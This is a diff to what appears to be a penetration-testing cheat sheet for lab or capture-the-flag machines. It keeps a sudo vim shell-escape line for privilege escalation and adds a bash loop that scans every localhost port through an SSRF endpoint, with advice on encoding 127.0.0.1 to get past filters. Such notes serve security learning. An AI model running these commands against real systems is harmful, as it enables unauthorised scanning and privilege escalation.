@@ -83,3 +83,19 @@ export TERM=xterm-256color
 sudo vim -c ":!/bin/sh"
 ```
 <br/>
+
+### SSRF attack to see which port is open
+- We can use bash script instead of Burp Suite Intruder attack
+```bash
+# Run the script directly
+./ssrf-open-ports.sh
+
+# Run the source code directly in the terminal. 127.0.0.1 can be replaced with its Decimal (2130706433) or Hexadecimal (0x7f000001) counterparts to bypass restrictions.
+for x in {1..65535};
+    do cmd=$(curl -so /dev/null http://10.10.xx.xx:8080/attack?url=http://127.0.0.1:${x} \
+        -w %{size_download});
+    if [ $cmd != 1040 ]; then
+        echo "Open port: $x"
+    fi
+done
+```
